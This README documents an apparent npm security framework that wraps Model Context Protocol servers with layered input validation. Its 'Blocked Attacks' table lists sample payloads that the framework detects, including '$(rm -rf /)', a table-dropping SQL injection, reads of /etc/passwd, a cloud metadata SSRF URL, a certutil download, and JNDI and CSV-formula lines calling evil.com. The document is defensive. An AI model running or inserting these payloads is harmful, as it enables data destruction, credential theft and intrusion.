# MCP Security Framework

A universal security-by-default framework for Model Context Protocol (MCP) servers that provides multi-layered defense against traditional attacks and AI-driven threats.

## Overview

The MCP Security Framework acts as a universal wrapper for any MCP server, providing comprehensive security validation through a multi-layered architecture. It works like helmet for Express - providing essential security without breaking existing functionality.

## Features

- **Universal Compatibility** - Works with any MCP server using @modelcontextprotocol/sdk
- **5-Layer Defense by Default** - Security architecture covering structure, content, behavior, semantics, and contextual validation
- **Extensible Layer 5** - Add custom validators, domain restrictions, OAuth validation, and response filtering
- **Zero Configuration** - Security enabled by default with sensible defaults
- **Opt-in Logging** - Quiet by default for production use
- **Performance Optimized** - Content caching and efficient pattern detection
- **Production Ready** - Pen-tested with comprehensive attack coverage

## Architecture

```
                          MCP Security Framework (5 Layers by Default)
                                          |
    +-------------+-------------+-------------+-------------+-------------+
    |             |             |             |             |             |
+---v----+  +-----v-----+  +----v----+  +----v-----+  +-----v------+
| Layer 1|  |  Layer 2  |  | Layer 3 |  |  Layer 4 |  |  Layer 5   |
|Struct. |  |  Content  |  | Behavior|  | Semantics|  | Contextual |
+--------+  +-----------+  +---------+  +----------+  +------------+
|JSON-RPC|  |Injection  |  |Rate     |  |Tool      |  |Custom      |
|Format  |  |Detection  |  |Limiting |  |Contracts |  |Validators  |
|Size    |  |XSS/SQLi   |  |Burst    |  |Quotas    |  |Domain/OAuth|
|Encoding|  |Proto Poll |  |Patterns |  |Policies  |  |Response Val|
+--------+  +-----------+  +---------+  +----------+  +------------+
```

### Security Layers

1. **Layer 1 - Structure Validation**
   - JSON-RPC format validation
   - Request size limits
   - Encoding validation

2. **Layer 2 - Content Validation**
   - Path traversal protection
   - Command injection detection
   - SQL/NoSQL injection prevention
   - XSS protection
   - Prototype pollution detection
   - XML entity attack prevention (XXE, Billion Laughs)
   - CRLF injection prevention

3. **Layer 3 - Behavior Validation**
   - Rate limiting
   - Burst detection
   - Request pattern analysis

4. **Layer 4 - Semantic Validation**
   - Tool contract enforcement
   - Resource access policies
   - Quota management

5. **Layer 5 - Contextual Validation** *(Enabled by default, fully configurable)*
   - Custom validator registration
   - Domain blocklist/allowlist enforcement
   - OAuth URL validation
   - Response content validation
   - Priority-based rule ordering
   - Context store for cross-request state

## Quick Start

### Installation

```bash
npm install mcp-security-framework
```

### Basic Usage

```javascript
import { SecureMcpServer } from 'mcp-security-framework';
import { StdioServerTransport } from '@modelcontextprotocol/sdk/server/stdio.js';

// Create a secure server (drop-in replacement for McpServer)
// Logging is OFF by default (quiet mode)
const server = new SecureMcpServer(
  { name: 'my-server', version: '1.0.0' }
);

// Register tools as normal
server.tool('my-tool', 'My tool description', { text: z.string() }, async ({ text }) => {
  return { content: [{ type: 'text', text: `Result: ${text}` }] };
});

// Connect with automatic security wrapping
const transport = new StdioServerTransport();
await server.connect(transport);
```

### With Logging (Opt-in)

```javascript
const server = new SecureMcpServer(
  { name: 'my-server', version: '1.0.0' },
  {
    enableLogging: true,           // Enable logging
    verboseLogging: true,          // Detailed decision logs
    logPerformanceMetrics: true,   // Timing statistics
    logLevel: 'debug'              // Log level
  }
);
```

### Available Exports

```javascript
import {
  SecureMcpServer,
  SecureTransport,
  ContextualValidationLayer,
  ContextualConfigBuilder,
  createContextualLayer
} from 'mcp-security-framework';
```

| Export | Description |
|--------|-------------|
| `SecureMcpServer` | Drop-in replacement for McpServer with built-in 5-layer security |
| `SecureTransport` | Transport wrapper for message-level validation |
| `ContextualValidationLayer` | Layer 5 class for advanced customization |
| `ContextualConfigBuilder` | Builder for Layer 5 configuration |
| `createContextualLayer` | Factory function for Layer 5 with defaults |

### Test Server

Run the included test server to see the framework in action:

```bash
npm run minimal-server
```

The test server includes 7 tools protected by the security framework:
- `debug-calculator` - Basic math operations
- `debug-file-reader` - Safe file reading
- `debug-echo` - Text echo service
- `debug-database` - Database query simulation
- `debug-http` - HTTP request simulation
- `debug-parser` - JSON/XML parsing
- `debug-image` - Image processing simulation

### Claude Desktop Integration

Add to your Claude Desktop configuration:

```json
{
  "mcpServers": {
    "secure-test": {
      "command": "node",
      "args": ["test-server/minimal-test-server.js"],
      "cwd": "/path/to/mcp-security-framework"
    }
  }
}
```

## Security Testing

### Blocked Attacks

| Attack Type | Example | Detection |
|------------|---------|-----------|
| Path Traversal | `../../../etc/passwd` | File access pattern detected |
| Command Injection | `$(rm -rf /)` | Command injection detected |
| SQL Injection | `'; DROP TABLE users; --` | SQL injection detected |
| XSS | `<script>alert('xss')</script>` | Script injection detected |
| Prototype Pollution | `{"__proto__": {"admin": true}}` | Prototype pollution detected |
| XML Entity (XXE) | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` | XML entity attack detected |
| Billion Laughs | `<!DOCTYPE lolz [<!ENTITY lol...` | XML entity attack detected |
| CRLF Injection | `\r\n\r\n` sequences | CRLF injection detected |
| NoSQL Injection | `{"$where": "..."}` | NoSQL injection detected |
| SSRF | `http://169.254.169.254/latest/meta-data/` | Cloud metadata endpoint blocked |
| CSV Injection | `=HYPERLINK("http://evil.com")` | Formula injection detected |
| LOLBins | `certutil -urlcache -split -f` | Living Off Land Binary detected |
| GraphQL Injection | `{__schema{types{name}}}` | GraphQL introspection blocked |
| Deserialization | `rO0ABXNy...` (Java), `O:8:"stdClass"` (PHP) | Serialized object detected |
| JNDI/Log4Shell | `${jndi:ldap://evil.com/exploit}` | JNDI lookup detected |

### Legitimate Operations (Allowed)
- Calculator: `25 * 4` returns `100`
- File Reader: `test-data/clean-safe.txt` returns file contents
- Echo: `Hello Claude!` returns `Echo: Hello Claude!`

## Configuration

```javascript
const server = new SecureMcpServer(
  { name: 'my-server', version: '1.0.0' },
  {
    // Request limits
    maxMessageSize: 50000,          // Maximum message size in bytes

    // Rate limiting (Layer 3)
    maxRequestsPerMinute: 30,       // Rate limit per minute
    maxRequestsPerHour: 500,        // Rate limit per hour
    burstThreshold: 10,             // Max requests in 10-second window

    // Logging (opt-in - all disabled by default)
    enableLogging: false,           // Enable security logging
    verboseLogging: false,          // Detailed decision logs
    logPerformanceMetrics: false,   // Timing statistics
    logLevel: 'info',               // Log level when logging enabled

    // Layer 4 Configuration
    toolRegistry: [...],            // Custom tool registry
    resourcePolicy: {...},          // Custom resource policy
    maxSessions: 5000,              // Maximum concurrent sessions
    sessionTtlMs: 30 * 60_000,      // Session TTL (30 minutes)

    // Layer 5 Configuration (enabled by default)
    contextual: {
      enabled: true,                // Set to false to disable Layer 5
      domainRestrictions: {
        enabled: true,
        blockedDomains: ['evil.com'],
        allowedDomains: []          // Empty = allow all except blocked
      },
      oauthValidation: {
        enabled: true,
        allowedDomains: ['oauth.example.com'],
        blockDangerousSchemes: true
      },
      rateLimiting: {               // Per-tool/method rate limiting
        enabled: true,
        limit: 20,
        windowMs: 60000
      }
    }
  }
);
```

## API Reference

### SecureMcpServer

Drop-in replacement for McpServer with built-in security.

```javascript
const server = new SecureMcpServer(serverInfo, options);

// McpServer delegation methods
server.tool(name, description, schema, handler);  // Register a tool
server.resource(name, uri, handler);              // Register a resource
server.prompt(name, description, handler);        // Register a prompt
await server.connect(transport);                  // Connect with secure transport
await server.close();                             // Close connection
server.isConnected();                             // Check connection status

// Security methods
server.getSecurityStats();                        // Get security statistics
server.getVerboseSecurityReport();                // Get detailed report (requires logging)
await server.generateSecurityReport();            // Generate full report (requires logging)
await server.shutdown();                          // Graceful shutdown with final report

// Property accessors
server.mcpServer;                                 // Access underlying McpServer
server.server;                                    // Access underlying Server
server.validationPipeline;                        // Access validation pipeline
```

### SecureTransport

Low-level transport wrapper for custom implementations.

```javascript
const secureTransport = new SecureTransport(transport, validator, options);
```

### Layer 5 Customization (Advanced)

Layer 5 is included by default. To add custom validators at runtime:

```javascript
import { SecureMcpServer, ContextualConfigBuilder } from 'mcp-security-framework';

// Configure Layer 5 via options
const server = new SecureMcpServer(
  { name: 'my-server', version: '1.0.0' },
  {
    contextual: {
      domainRestrictions: {
        enabled: true,
        blockedDomains: ['evil.com', 'malicious.net']
      }
    }
  }
);

// Access Layer 5 to add custom validators
const layer5 = server.validationPipeline.layers[4];

// Add custom validator with priority
layer5.addValidator('my-validator', (message, context) => {
  if (message.params?.arguments?.sensitive) {
    return {
      passed: false,
      reason: 'Sensitive data not allowed',
      severity: 'HIGH',
      violationType: 'CUSTOM_VIOLATION'
    };
  }
  return { passed: true };
}, { priority: 50, failOnError: true });

// Add global rules (run before validators)
layer5.addGlobalRule((message) => {
  if (message.method === 'forbidden/operation') {
    return { passed: false, reason: 'Operation blocked', severity: 'CRITICAL' };
  }
  return null; // Pass
});

// Add response validators
layer5.addResponseValidator('pii-check', (response) => {
  const content = JSON.stringify(response);
  if (/\d{3}-\d{2}-\d{4}/.test(content)) { // SSN pattern
    return { passed: false, reason: 'PII detected', severity: 'HIGH' };
  }
  return { passed: true };
});

// Use context store for cross-request state
layer5.setContext('user:session', { authenticated: true }, 300000); // 5 min TTL
const session = layer5.getContext('user:session');
```

### Disabling Layer 5

To use only the first 4 layers:

```javascript
const server = new SecureMcpServer(
  { name: 'my-server', version: '1.0.0' },
  { contextual: { enabled: false } }
);
```

## Development

### Running Tests

```bash
npm test              # All tests
npm run test:unit     # Unit tests only
npm run test:coverage # With coverage report
npm run lint          # ESLint
```

### Project Structure

```
src/
├── index.js                              # Main entry point
└── security/
    ├── mcp-secure-server.js              # SecureMcpServer (unified class)
    ├── constants.js                      # Configuration constants
    ├── transport/
    │   └── secure-transport.js           # SecureTransport
    ├── layers/
    │   ├── layer1-structure.js           # JSON-RPC validation
    │   ├── layer2-content.js             # Content/injection detection
    │   ├── layer2-validators/            # Modular validators
    │   ├── layer3-behavior.js            # Rate limiting
    │   ├── layer4-semantics.js           # Tool contracts
    │   ├── layer5-contextual.js          # Custom validators (optional)
    │   ├── validation-layer-base.js      # Base class
    │   └── layer-utils/
    │       ├── content/
    │       │   ├── canonicalize.js       # Text normalization
    │       │   ├── patterns/             # Attack pattern definitions
    │       │   └── utils/                # Helper utilities
    │       └── semantics/                # Semantic utilities
    └── utils/
        ├── validation-pipeline.js        # Multi-layer orchestration
        ├── security-logger.js            # Logging system
        └── error-sanitizer.js            # Safe error responses
```

## License

MIT License - see LICENSE file for details.

## Changelog

See [CHANGELOG.md](./CHANGELOG.md) for full version history.

### v0.8.0 (Current)
- **Layer 5 now enabled by default** - Contextual validation included in standard pipeline
- Domain restrictions, OAuth validation, and response filtering available out-of-box
- New exports: `ContextualValidationLayer`, `ContextualConfigBuilder`, `createContextualLayer`
- Consolidated `MCPSecurityMiddleware`, `EnhancedMCPSecurityMiddleware`, and `SecureMcpServer` into single `SecureMcpServer` class
- Logging now opt-in (quiet by default for production)
- Flattened options structure (no more `{ security: {...} }` nesting)
- Breaking change: `MCPSecurityMiddleware` and `EnhancedMCPSecurityMiddleware` exports removed
- 488 tests passing

### v0.7.1
- Added SSRF protection with cloud metadata endpoint blocking (AWS, GCP, Azure)
- Added deserialization attack detection (Java, PHP, Python, YAML, .NET, Ruby, JNDI)
- Added CSV injection and LOLBins detection
- Added GraphQL introspection blocking
- Updated SDK to v1.24.3 (security fix)
- 450 tests passing with enhanced coverage
